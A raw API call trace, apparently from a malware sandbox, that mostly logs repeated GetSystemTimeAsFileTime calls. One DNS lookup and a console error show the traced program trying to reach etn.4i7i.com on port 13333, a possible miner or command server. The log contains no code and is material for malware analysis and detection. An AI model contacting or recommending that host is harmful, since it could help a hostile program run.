GetSystemTimeAsFileTime,,0,1542888188.015
GetSystemTimeAsFileTime,,0,1542888188.218
GetSystemTimeAsFileTime,,0,1542888188.265
GetSystemTimeAsFileTime,,0,1542888188.265
GetSystemTimeAsFileTime,,0,1542888188.265
GetSystemTimeAsFileTime,,0,1542888188.265
GetSystemTimeAsFileTime,,0,1542888188.265
GetSystemTimeAsFileTime,,0,1542888188.265
GetSystemTimeAsFileTime,,0,1542888188.421
GetSystemTimeAsFileTime,,0,1542888188.625
GetSystemTimeAsFileTime,,0,1542888188.781
GetSystemTimeAsFileTime,,0,1542888188.781
GetSystemTimeAsFileTime,,0,1542888188.781
GetSystemTimeAsFileTime,,0,1542888188.781
GetSystemTimeAsFileTime,,0,1542888188.781
GetSystemTimeAsFileTime,,0,1542888188.781
GetSystemTimeAsFileTime,,0,1542888188.828
GetSystemTimeAsFileTime,,0,1542888189.031
GetSystemTimeAsFileTime,,0,1542888189.234
GetSystemTimeAsFileTime,,0,1542888189.281
GetSystemTimeAsFileTime,,0,1542888189.281
GetSystemTimeAsFileTime,,0,1542888189.281
GetSystemTimeAsFileTime,,0,1542888189.281
GetSystemTimeAsFileTime,,0,1542888189.281
GetSystemTimeAsFileTime,,0,1542888189.281
GetSystemTimeAsFileTime,,0,1542888189.437
GetSystemTimeAsFileTime,,0,1542888189.64
GetSystemTimeAsFileTime,,0,1542888189.796
GetSystemTimeAsFileTime,,0,1542888189.796
GetSystemTimeAsFileTime,,0,1542888189.796
GetSystemTimeAsFileTime,,0,1542888189.796
GetSystemTimeAsFileTime,,0,1542888189.796
GetSystemTimeAsFileTime,,0,1542888189.796
GetSystemTimeAsFileTime,,0,1542888189.843
GetSystemTimeAsFileTime,,0,1542888190.046
GetSystemTimeAsFileTime,,0,1542888190.25
GetSystemTimeAsFileTime,,0,1542888190.296
GetSystemTimeAsFileTime,,0,1542888190.296
GetSystemTimeAsFileTime,,0,1542888190.296
GetSystemTimeAsFileTime,,0,1542888190.296
GetSystemTimeAsFileTime,,0,1542888190.296
GetSystemTimeAsFileTime,,0,1542888190.296
GetSystemTimeAsFileTime,,0,1542888190.453
GetSystemTimeAsFileTime,,0,1542888190.656
GetSystemTimeAsFileTime,,0,1542888190.796
GetSystemTimeAsFileTime,,0,1542888190.796
GetSystemTimeAsFileTime,,0,1542888190.796
GetSystemTimeAsFileTime,,0,1542888190.796
GetSystemTimeAsFileTime,,0,1542888190.796
GetSystemTimeAsFileTime,,0,1542888190.796
GetSystemTimeAsFileTime,,0,1542888190.859
GetSystemTimeAsFileTime,,0,1542888191.062
GetSystemTimeAsFileTime,,0,1542888191.265
GetSystemTimeAsFileTime,,0,1542888191.312
GetSystemTimeAsFileTime,,0,1542888191.312
GetSystemTimeAsFileTime,,0,1542888191.312
GetSystemTimeAsFileTime,,0,1542888191.312
GetSystemTimeAsFileTime,,0,1542888191.312
GetSystemTimeAsFileTime,,0,1542888191.312
GetAddrInfoW,etn.4i7i.com#,11001,1542888191.468
GetSystemTimeAsFileTime,,0,1542888191.468
GetSystemTimeAsFileTime,,0,1542888191.468
GetFileType,0x00000007,2,1542888191.468
WriteConsoleW,[2018-11-22 21:43:11]#0x0000000f,1,1542888191.468
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888191.468
GetSystemTimeAsFileTime,,0,1542888191.671
GetSystemTimeAsFileTime,,0,1542888191.812
GetSystemTimeAsFileTime,,0,1542888191.812
GetSystemTimeAsFileTime,,0,1542888191.812
GetSystemTimeAsFileTime,,0,1542888191.812
GetSystemTimeAsFileTime,,0,1542888191.812
GetSystemTimeAsFileTime,,0,1542888191.812
GetSystemTimeAsFileTime,,0,1542888191.875
GetSystemTimeAsFileTime,,0,1542888192.078
GetSystemTimeAsFileTime,,0,1542888192.281
GetSystemTimeAsFileTime,,0,1542888192.328
GetSystemTimeAsFileTime,,0,1542888192.328
GetSystemTimeAsFileTime,,0,1542888192.328
GetSystemTimeAsFileTime,,0,1542888192.328
GetSystemTimeAsFileTime,,0,1542888192.328
GetSystemTimeAsFileTime,,0,1542888192.328
GetSystemTimeAsFileTime,,0,1542888192.484
GetSystemTimeAsFileTime,,0,1542888192.687
GetSystemTimeAsFileTime,,0,1542888192.828
GetSystemTimeAsFileTime,,0,1542888192.828
GetSystemTimeAsFileTime,,0,1542888192.828
GetSystemTimeAsFileTime,,0,1542888192.828
GetSystemTimeAsFileTime,,0,1542888192.828
GetSystemTimeAsFileTime,,0,1542888192.828
GetSystemTimeAsFileTime,,0,1542888192.89
GetSystemTimeAsFileTime,,0,1542888193.093
GetSystemTimeAsFileTime,,0,1542888193.296
GetSystemTimeAsFileTime,,0,1542888193.343
GetSystemTimeAsFileTime,,0,1542888193.343
GetSystemTimeAsFileTime,,0,1542888193.343
GetSystemTimeAsFileTime,,0,1542888193.343
GetSystemTimeAsFileTime,,0,1542888193.343
GetSystemTimeAsFileTime,,0,1542888193.343
GetSystemTimeAsFileTime,,0,1542888193.5
GetSystemTimeAsFileTime,,0,1542888193.703
GetSystemTimeAsFileTime,,0,1542888193.859
GetSystemTimeAsFileTime,,0,1542888193.859
GetSystemTimeAsFileTime,,0,1542888193.859
GetSystemTimeAsFileTime,,0,1542888193.859
GetSystemTimeAsFileTime,,0,1542888193.859
GetSystemTimeAsFileTime,,0,1542888193.859
GetSystemTimeAsFileTime,,0,1542888193.906
GetSystemTimeAsFileTime,,0,1542888194.109
GetSystemTimeAsFileTime,,0,1542888194.312
GetSystemTimeAsFileTime,,0,1542888194.359
GetSystemTimeAsFileTime,,0,1542888194.359
GetSystemTimeAsFileTime,,0,1542888194.359
GetSystemTimeAsFileTime,,0,1542888194.359
GetSystemTimeAsFileTime,,0,1542888194.359
GetSystemTimeAsFileTime,,0,1542888194.359
GetSystemTimeAsFileTime,,0,1542888194.515
GetSystemTimeAsFileTime,,0,1542888194.718
GetSystemTimeAsFileTime,,0,1542888194.875
GetSystemTimeAsFileTime,,0,1542888194.875
GetSystemTimeAsFileTime,,0,1542888194.875
GetSystemTimeAsFileTime,,0,1542888194.875
GetSystemTimeAsFileTime,,0,1542888194.875
GetSystemTimeAsFileTime,,0,1542888194.875
GetSystemTimeAsFileTime,,0,1542888194.875
GetSystemTimeAsFileTime,,0,1542888194.921
GetSystemTimeAsFileTime,,0,1542888195.125
GetSystemTimeAsFileTime,,0,1542888195.328
GetSystemTimeAsFileTime,,0,1542888195.39
GetSystemTimeAsFileTime,,0,1542888195.39
GetSystemTimeAsFileTime,,0,1542888195.39
GetSystemTimeAsFileTime,,0,1542888195.39
GetSystemTimeAsFileTime,,0,1542888195.39
GetSystemTimeAsFileTime,,0,1542888195.39
GetSystemTimeAsFileTime,,0,1542888195.531
GetSystemTimeAsFileTime,,0,1542888195.734
GetSystemTimeAsFileTime,,0,1542888195.89
GetSystemTimeAsFileTime,,0,1542888195.89
GetSystemTimeAsFileTime,,0,1542888195.89
GetSystemTimeAsFileTime,,0,1542888195.89
GetSystemTimeAsFileTime,,0,1542888195.89
GetSystemTimeAsFileTime,,0,1542888195.89
GetSystemTimeAsFileTime,,0,1542888195.937
GetSystemTimeAsFileTime,,0,1542888196.14
GetSystemTimeAsFileTime,,0,1542888196.343
GetSystemTimeAsFileTime,,0,1542888196.406
GetSystemTimeAsFileTime,,0,1542888196.406
GetSystemTimeAsFileTime,,0,1542888196.406
GetSystemTimeAsFileTime,,0,1542888196.406
GetSystemTimeAsFileTime,,0,1542888196.406
GetSystemTimeAsFileTime,,0,1542888196.406
GetSystemTimeAsFileTime,,0,1542888196.546
GetSystemTimeAsFileTime,,0,1542888196.75
GetSystemTimeAsFileTime,,0,1542888196.921
GetSystemTimeAsFileTime,,0,1542888196.921
GetSystemTimeAsFileTime,,0,1542888196.921
GetSystemTimeAsFileTime,,0,1542888196.921
GetSystemTimeAsFileTime,,0,1542888196.921
GetSystemTimeAsFileTime,,0,1542888196.921
GetSystemTimeAsFileTime,,0,1542888196.953
GetSystemTimeAsFileTime,,0,1542888197.156
